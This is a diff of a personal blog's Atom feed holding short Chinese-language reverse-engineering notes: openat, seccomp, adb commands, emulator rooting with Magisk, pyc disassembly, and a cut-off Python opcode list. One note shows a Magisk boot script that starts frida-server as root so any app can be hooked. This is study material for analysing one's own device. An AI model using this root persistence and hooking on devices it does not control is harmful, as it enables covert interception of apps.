@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-05-28T17:16:54.000Z</updated>
+  <updated>2024-06-07T08:24:05.000Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,164 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>RootAndroidStudio_emulator</title>
-    <link href="http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/RootAndroidStudio_emulator/"/>
-    <id>http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/RootAndroidStudio_emulator/</id>
+    <title>api</title>
+    <link href="http://example.com/2024/06/07/Web/Python/api/"/>
+    <id>http://example.com/2024/06/07/Web/Python/api/</id>
+    <published>2024-06-07T08:23:29.000Z</published>
+    <updated>2024-06-07T08:24:05.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>os.path.join</p><p>以最后出现&#x2F;的字符串为基地址</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;os.path.join&lt;/p&gt;
+&lt;p&gt;以最后出现&amp;#x2F;的字符串为基地址&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="http://example.com/categories/Web/"/>
+    
+    <category term="Python" scheme="http://example.com/categories/Web/Python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>openat</title>
+    <link href="http://example.com/2024/06/07/Pwn/linux/api/openat/"/>
+    <id>http://example.com/2024/06/07/Pwn/linux/api/openat/</id>
+    <published>2024-06-07T07:30:00.000Z</published>
+    <updated>2024-06-07T07:37:14.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>open函数原型</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int openat(int dirfd, const char *pathname, int flags);</span><br><span class="line">int openat(int dirfd, const char *pathname, int flags, mode_t mode);</span><br></pre></td></tr></table></figure></div><p>fd参数如下</p><p><a class="link"   href="https://docs.huihoo.com/doxygen/linux/kernel/3.7/include_2uapi_2linux_2fcntl_8h.html" >Linux 内核：include&#x2F;uapi&#x2F;linux&#x2F;fcntl.h 文件参考 (huihoo.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AT_FDCWD -100</span><br></pre></td></tr></table></figure></div>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;open函数原型&lt;/p&gt;
+&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Plaintext&quot;&gt;&lt;figure class=&quot;iseeu highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
+      
+    
+    
+    
+    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
+    
+    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
+    
+    <category term="api" scheme="http://example.com/categories/Pwn/linux/api/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>seccomp</title>
+    <link href="http://example.com/2024/06/07/Pwn/linux/seccomp/"/>
+    <id>http://example.com/2024/06/07/Pwn/linux/seccomp/</id>
+    <published>2024-06-07T07:22:14.000Z</published>
+    <updated>2024-06-07T07:22:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Sandbox的安全机制"><a href="#Sandbox的安全机制" class="headerlink" title="Sandbox的安全机制"></a>Sandbox的安全机制</h2><p>限制系统调用</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Sandbox的安全机制&quot;&gt;&lt;a href=&quot;#Sandbox的安全机制&quot; class=&quot;headerlink&quot; title=&quot;Sandbox的安全机制&quot;&gt;&lt;/a&gt;Sandbox的安全机制&lt;/h2&gt;&lt;p&gt;限制系统调用&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
+    
+    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>模拟发包</title>
+    <link href="http://example.com/2024/06/03/Web/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/"/>
+    <id>http://example.com/2024/06/03/Web/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/</id>
+    <published>2024-06-03T14:55:17.000Z</published>
+    <updated>2024-06-03T14:55:27.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>scapy</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;scapy&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="http://example.com/categories/Web/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>misc</title>
+    <link href="http://example.com/2024/06/03/Re/%E5%AE%89%E5%8D%93/misc/"/>
+    <id>http://example.com/2024/06/03/Re/%E5%AE%89%E5%8D%93/misc/</id>
+    <published>2024-06-02T18:05:51.000Z</published>
+    <updated>2024-06-02T18:15:38.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="应用操作"><a href="#应用操作" class="headerlink" title="应用操作"></a>应用操作</h2><h3 id="手动发送广播"><a href="#手动发送广播" class="headerlink" title="手动发送广播"></a>手动发送广播</h3><blockquote><p><a class="link"   href="https://www.cnblogs.com/tc310/p/11152853.html" >Android通过adb shell am broadcast发送广播 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><h3 id="启动actvity"><a href="#启动actvity" class="headerlink" title="启动actvity"></a>启动actvity</h3><blockquote><p><a class="link"   href="https://www.cnblogs.com/yhjoker/p/8974119.html" >Android Studio 动态调试 apk 反编译出的 smali 代码 - yhjoker - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><code> adb shell am start -D -S -W packageName/ActivityName</code>    &#x2F;&#x2F;以调试状态运行目标activity </p></blockquote><h2 id="自启动任务"><a href="#自启动任务" class="headerlink" title="自启动任务"></a>自启动任务</h2><p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p><p>注意给xxx权限(<code>chmod +xxx</code>)</p><p>比如</p><blockquote><p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p><p>2、<code>chmod +xxx frida.sh</code></p><p>重启后用frida hook任意应用,能hook即可</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;应用操作&quot;&gt;&lt;a href=&quot;#应用操作&quot; class=&quot;headerlink&quot; title=&quot;应用操作&quot;&gt;&lt;/a&gt;应用操作&lt;/h2&gt;&lt;h3 id=&quot;手动发送广播&quot;&gt;&lt;a href=&quot;#手动发送广播&quot; class=&quot;headerlink&quot; title=&quot;手动发送广</summary>
+      
+    
+    
+    
+    <category term="Re" scheme="http://example.com/categories/Re/"/>
+    
+    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>自动任务</title>
+    <link href="http://example.com/2024/06/02/Re/%E5%AE%89%E5%8D%93/%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1/"/>
+    <id>http://example.com/2024/06/02/Re/%E5%AE%89%E5%8D%93/%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1/</id>
+    <published>2024-06-02T10:06:19.000Z</published>
+    <updated>2024-06-02T17:59:08.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>向<code>/data/adb/post-fs-data.d</code>写入自定义<code>.sh</code>文件即可</p><p>注意给xxx权限(<code>chmod +xxx</code>)</p><p>比如</p><blockquote><p>1、<code>su -c /data/local/tmp/frida-server-16.3.1-android-arm</code>写入frida.sh(名字任意)</p><p>2、<code>chmod +xxx frida.sh</code></p><p>重启后用frida hook任意应用,能hook即可</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;向&lt;code&gt;/data/adb/post-fs-data.d&lt;/code&gt;写入自定义&lt;code&gt;.sh&lt;/code&gt;文件即可&lt;/p&gt;
+&lt;p&gt;注意给xxx权限(&lt;code&gt;chmod +xxx&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;比如&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、</summary>
+      
+    
+    
+    
+    <category term="Re" scheme="http://example.com/categories/Re/"/>
+    
+    <category term="安卓" scheme="http://example.com/categories/Re/%E5%AE%89%E5%8D%93/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>AndroidStudioemulator_Root</title>
+    <link href="http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/AndroidStudioemulator_Root/"/>
+    <id>http://example.com/2024/05/29/Re/%E5%AE%89%E5%8D%93/AndroidStudioemulator_Root/</id>
     <published>2024-05-28T17:15:59.000Z</published>
-    <updated>2024-05-28T17:16:54.000Z</updated>
+    <updated>2024-06-03T13:53:23.000Z</updated>
     
     <content type="html"><![CDATA[<p>[<a class="link"   href="https://xdaforums.com/t/script-rootavd-root-your-android-studio-virtual-device-emulator-with-magisk-android-linux-darwin-macos-win-google-play-store-apis.4218123/" >SCRIPT] rootAVD - root your Android Studio Virtual Device emulator with Magisk [Android][Linux][Darwin&#x2F;MacOS][WIN][Google Play Store APIs] | XDA Forums <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
     
@@ -180,7 +333,7 @@
     <link href="http://example.com/2024/05/01/Re/%E5%AE%89%E5%8D%93/aab2apk/"/>
     <id>http://example.com/2024/05/01/Re/%E5%AE%89%E5%8D%93/aab2apk/</id>
     <published>2024-04-30T17:51:28.000Z</published>
-    <updated>2024-04-30T17:51:46.000Z</updated>
+    <updated>2024-06-02T10:02:52.000Z</updated>
     
     <content type="html"><![CDATA[<p><a class="link"   href="https://jedok.com/converter/aab-to-apk" >https://jedok.com/converter/aab-to-apk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>有在线转换器</p>]]></content>
     
@@ -327,157 +480,6 @@
     <category term="Re" scheme="http://example.com/categories/Re/"/>
     
     <category term="QEMU" scheme="http://example.com/categories/Re/QEMU/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>riscv</title>
-    <link href="http://example.com/2024/04/17/Re/QEMU/riscv/"/>
-    <id>http://example.com/2024/04/17/Re/QEMU/riscv/</id>
-    <published>2024-04-17T12:56:32.000Z</published>
-    <updated>2024-04-17T12:56:48.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><code>qemu-system-riscv64 -machine virt -nographic -bios ./rustsbi-qemu.bin -device loader,file=./os.bin,addr=0x80200000</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;code&gt;qemu-system-riscv64 -machine virt -nographic -bios ./rustsbi-qemu.bin -device loader,file=./os.bin,addr=0x80200000&lt;/code&gt;&lt;/p&gt;
-</summary>
-      
-    
-    
-    
-    <category term="Re" scheme="http://example.com/categories/Re/"/>
-    
-    <category term="QEMU" scheme="http://example.com/categories/Re/QEMU/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Untitled</title>
-    <link href="http://example.com/2024/04/15/Re/JavaScript/electron/Untitled/"/>
-    <id>http://example.com/2024/04/15/Re/JavaScript/electron/Untitled/</id>
-    <published>2024-04-15T05:17:53.000Z</published>
-    <updated>2024-04-15T05:17:53.000Z</updated>
-    
-    
-    
-    
-    <category term="Re" scheme="http://example.com/categories/Re/"/>
-    
-    <category term="JavaScript" scheme="http://example.com/categories/Re/JavaScript/"/>
-    
-    <category term="electron" scheme="http://example.com/categories/Re/JavaScript/electron/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>环境配置</title>
-    <link href="http://example.com/2024/04/13/%E5%BC%80%E5%8F%91/IOT/Clion/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
-    <id>http://example.com/2024/04/13/%E5%BC%80%E5%8F%91/IOT/Clion/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
-    <published>2024-04-13T13:54:06.000Z</published>
-    <updated>2024-05-01T02:38:58.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><blockquote><p>1.Clion</p><ol start="2"><li></li></ol></blockquote><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404180146023.png"                      alt="image-20240418014608801"                ></p><blockquote><p>路径引用问题将下面的改为绝对路径即可</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404180146290.png"                      alt="image-20240418014650216"                ></p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h1&gt;&lt;blockquote&gt;
-&lt;p&gt;1.Clion&lt;/p&gt;
-&lt;ol start=&quot;2&quot;&gt;
-&lt;li&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/blockquote&gt;
-</summary>
-      
-    
-    
-    
-    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
-    
-    <category term="IOT" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/IOT/"/>
-    
-    <category term="Clion" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/IOT/Clion/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>dis反编译pyc</title>
-    <link href="http://example.com/2024/04/13/python/dis%E5%8F%8D%E7%BC%96%E8%AF%91pyc/"/>
-    <id>http://example.com/2024/04/13/python/dis%E5%8F%8D%E7%BC%96%E8%AF%91pyc/</id>
-    <published>2024-04-13T10:36:59.000Z</published>
-    <updated>2024-04-14T11:16:45.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>MAGIC_NUMBER</p><p><a class="link"   href="https://github.com/zrax/pycdc/blob/6467c2cc52aa714876e131a1b6c6cf25f129460f/pyc_module.h#L7" >pycdc&#x2F;pyc_module.h at 6467c2cc52aa714876e131a1b6c6cf25f129460f · zrax&#x2F;pycdc (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">enum PycMagic &#123;</span><br><span class="line">    MAGIC_1_0 = 0x00999902,</span><br><span class="line">    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */</span><br><span class="line">    MAGIC_1_3 = 0x0A0D2E89,</span><br><span class="line">    MAGIC_1_4 = 0x0A0D1704,</span><br><span class="line">    MAGIC_1_5 = 0x0A0D4E99,</span><br><span class="line">    MAGIC_1_6 = 0x0A0DC4FC,</span><br><span class="line"></span><br><span class="line">    MAGIC_2_0 = 0x0A0DC687,</span><br><span class="line">    MAGIC_2_1 = 0x0A0DEB2A,</span><br><span class="line">    MAGIC_2_2 = 0x0A0DED2D,</span><br><span class="line">    MAGIC_2_3 = 0x0A0DF23B,</span><br><span class="line">    MAGIC_2_4 = 0x0A0DF26D,</span><br><span class="line">    MAGIC_2_5 = 0x0A0DF2B3,</span><br><span class="line">    MAGIC_2_6 = 0x0A0DF2D1,</span><br><span class="line">    MAGIC_2_7 = 0x0A0DF303,</span><br><span class="line"></span><br><span class="line">    MAGIC_3_0 = 0x0A0D0C3A,</span><br><span class="line">    MAGIC_3_1 = 0x0A0D0C4E,</span><br><span class="line">    MAGIC_3_2 = 0x0A0D0C6C,</span><br><span class="line">    MAGIC_3_3 = 0x0A0D0C9E,</span><br><span class="line">    MAGIC_3_4 = 0x0A0D0CEE,</span><br><span class="line">    MAGIC_3_5 = 0x0A0D0D16,</span><br><span class="line">    MAGIC_3_5_3 = 0x0A0D0D17,</span><br><span class="line">    MAGIC_3_6 = 0x0A0D0D33,</span><br><span class="line">    MAGIC_3_7 = 0x0A0D0D42,</span><br><span class="line">    MAGIC_3_8 = 0x0A0D0D55,</span><br><span class="line">    MAGIC_3_9 = 0x0A0D0D61,</span><br><span class="line">    MAGIC_3_10 = 0x0A0D0D6F,</span><br><span class="line">    MAGIC_3_11 = 0x0A0D0DA7,</span><br><span class="line">    MAGIC_3_12 = 0x0A0D0DCB,</span><br><span class="line"></span><br><span class="line">    INVALID = 0,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fd=<span class="built_in">open</span>(<span class="string">&#x27;xxx.pyc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        fd.read(i)</span><br><span class="line">        tmp=marshal.load(fd)<span class="comment">#不同版本位置可能不一样</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        dis.dis(tmp)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ifndef Py_OPCODE_H</span></span><br><span class="line"><span class="comment">#define Py_OPCODE_H</span></span><br><span class="line"><span class="comment">#ifdef __cplusplus</span></span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Instruction opcodes <span class="keyword">for</span> compiled code */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STOP_CODE   0</span></span><br><span class="line"><span class="comment">#define POP_TOP     1</span></span><br><span class="line"><span class="comment">#define ROT_TWO     2</span></span><br><span class="line"><span class="comment">#define ROT_THREE   3</span></span><br><span class="line"><span class="comment">#define DUP_TOP     4</span></span><br><span class="line"><span class="comment">#define ROT_FOUR    5</span></span><br><span class="line"><span class="comment">#define NOP     9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define UNARY_POSITIVE  10</span></span><br><span class="line"><span class="comment">#define UNARY_NEGATIVE  11</span></span><br><span class="line"><span class="comment">#define UNARY_NOT   12</span></span><br><span class="line"><span class="comment">#define UNARY_CONVERT   13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define UNARY_INVERT    15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_POWER    19</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_MULTIPLY 20</span></span><br><span class="line"><span class="comment">#define BINARY_DIVIDE   21</span></span><br><span class="line"><span class="comment">#define BINARY_MODULO   22</span></span><br><span class="line"><span class="comment">#define BINARY_ADD  23</span></span><br><span class="line"><span class="comment">#define BINARY_SUBTRACT 24</span></span><br><span class="line"><span class="comment">#define BINARY_SUBSCR   25</span></span><br><span class="line"><span class="comment">#define BINARY_FLOOR_DIVIDE 26</span></span><br><span class="line"><span class="comment">#define BINARY_TRUE_DIVIDE 27</span></span><br><span class="line"><span class="comment">#define INPLACE_FLOOR_DIVIDE 28</span></span><br><span class="line"><span class="comment">#define INPLACE_TRUE_DIVIDE 29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SLICE       30</span></span><br><span class="line">/* Also uses <span class="number">31</span>-<span class="number">33</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_SLICE 40</span></span><br><span class="line">/* Also uses <span class="number">41</span>-<span class="number">43</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define DELETE_SLICE    50</span></span><br><span class="line">/* Also uses <span class="number">51</span>-<span class="number">53</span> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_MAP   54</span></span><br><span class="line"><span class="comment">#define INPLACE_ADD 55</span></span><br><span class="line"><span class="comment">#define INPLACE_SUBTRACT    56</span></span><br><span class="line"><span class="comment">#define INPLACE_MULTIPLY    57</span></span><br><span class="line"><span class="comment">#define INPLACE_DIVIDE  58</span></span><br><span class="line"><span class="comment">#define INPLACE_MODULO  59</span></span><br><span class="line"><span class="comment">#define STORE_SUBSCR    60</span></span><br><span class="line"><span class="comment">#define DELETE_SUBSCR   61</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define BINARY_LSHIFT   62</span></span><br><span class="line"><span class="comment">#define BINARY_RSHIFT   63</span></span><br><span class="line"><span class="comment">#define BINARY_AND  64</span></span><br><span class="line"><span class="comment">#define BINARY_XOR  65</span></span><br><span class="line"><span class="comment">#define BINARY_OR   66</span></span><br><span class="line"><span class="comment">#define INPLACE_POWER   67</span></span><br><span class="line"><span class="comment">#define GET_ITER    68</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define PRINT_EXPR  70</span></span><br><span class="line"><span class="comment">#define PRINT_ITEM  71</span></span><br><span class="line"><span class="comment">#define PRINT_NEWLINE   72</span></span><br><span class="line"><span class="comment">#define PRINT_ITEM_TO   73</span></span><br><span class="line"><span class="comment">#define PRINT_NEWLINE_TO 74</span></span><br><span class="line"><span class="comment">#define INPLACE_LSHIFT  75</span></span><br><span class="line"><span class="comment">#define INPLACE_RSHIFT  76</span></span><br><span class="line"><span class="comment">#define INPLACE_AND 77</span></span><br><span class="line"><span class="comment">#define INPLACE_XOR 78</span></span><br><span class="line"><span class="comment">#define INPLACE_OR  79</span></span><br><span class="line"><span class="comment">#define BREAK_LOOP  80</span></span><br><span class="line"><span class="comment">#define WITH_CLEANUP    81</span></span><br><span class="line"><span class="comment">#define LOAD_LOCALS 82</span></span><br><span class="line"><span class="comment">#define RETURN_VALUE    83</span></span><br><span class="line"><span class="comment">#define IMPORT_STAR 84</span></span><br><span class="line"><span class="comment">#define EXEC_STMT   85</span></span><br><span class="line"><span class="comment">#define YIELD_VALUE 86</span></span><br><span class="line"><span class="comment">#define POP_BLOCK   87</span></span><br><span class="line"><span class="comment">#define END_FINALLY 88</span></span><br><span class="line"><span class="comment">#define BUILD_CLASS 89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define HAVE_ARGUMENT   90  /* Opcodes from here have an argument: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_NAME  90  /* Index in name list */</span></span><br><span class="line"><span class="comment">#define DELETE_NAME 91  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define UNPACK_SEQUENCE 92  /* Number of sequence items */</span></span><br><span class="line"><span class="comment">#define FOR_ITER    93</span></span><br><span class="line"><span class="comment">#define LIST_APPEND 94</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define STORE_ATTR  95  /* Index in name list */</span></span><br><span class="line"><span class="comment">#define DELETE_ATTR 96  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define STORE_GLOBAL    97  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define DELETE_GLOBAL   98  /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define DUP_TOPX    99  /* number of items to duplicate */</span></span><br><span class="line"><span class="comment">#define LOAD_CONST  100 /* Index in const list */</span></span><br><span class="line"><span class="comment">#define LOAD_NAME   101 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define BUILD_TUPLE 102 /* Number of tuple items */</span></span><br><span class="line"><span class="comment">#define BUILD_LIST  103 /* Number of list items */</span></span><br><span class="line"><span class="comment">#define BUILD_SET   104     /* Number of set items */</span></span><br><span class="line"><span class="comment">#define BUILD_MAP   105 /* Always zero for now */</span></span><br><span class="line"><span class="comment">#define LOAD_ATTR   106 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define COMPARE_OP  107 /* Comparison operator */</span></span><br><span class="line"><span class="comment">#define IMPORT_NAME 108 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define IMPORT_FROM 109 /* Index in name list */</span></span><br><span class="line"><span class="comment">#define JUMP_FORWARD    110 /* Number of bytes to skip */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define JUMP_IF_FALSE_OR_POP 111 /* Target byte offset from beginning</span></span><br><span class="line">                                    of code */</span><br><span class="line"><span class="comment">#define JUMP_IF_TRUE_OR_POP 112 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define JUMP_ABSOLUTE   113 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define POP_JUMP_IF_FALSE 114   /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define POP_JUMP_IF_TRUE 115    /* &quot;&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LOAD_GLOBAL 116 /* Index in name list */</span></span><br><span 